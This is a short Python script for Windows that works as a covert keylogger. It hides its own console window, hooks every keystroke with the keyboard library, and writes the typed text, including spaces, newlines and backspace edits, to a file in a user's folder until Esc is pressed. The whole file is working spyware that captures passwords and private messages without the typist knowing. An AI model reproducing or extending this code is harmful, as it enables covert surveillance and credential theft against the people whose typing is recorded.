import win32console
import win32gui
import keyboard

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def on_keyboard_event(e):
    if e.event_type == keyboard.KEY_DOWN:
        if e.name == 'space':
            keylogs = ' '
        elif e.name == 'enter':
            keylogs = '\n'
        elif e.name == 'backspace':
            # Simulate a backspace by removing the last character in the file
            with open('C:\\Users\\loaner\\output.txt', 'r') as f:
                content = f.read()
            
            with open('C:\\Users\\loaner\\output.txt', 'w') as f:
                f.write(content[:-1])
                
            return
        else:
            keylogs = e.name

        with open('C:\\Users\\loaner\\output.txt', 'a') as f:
            f.write(keylogs)

keyboard.hook(on_keyboard_event)
keyboard.wait('esc')  # Wait for the 'esc' key to exit
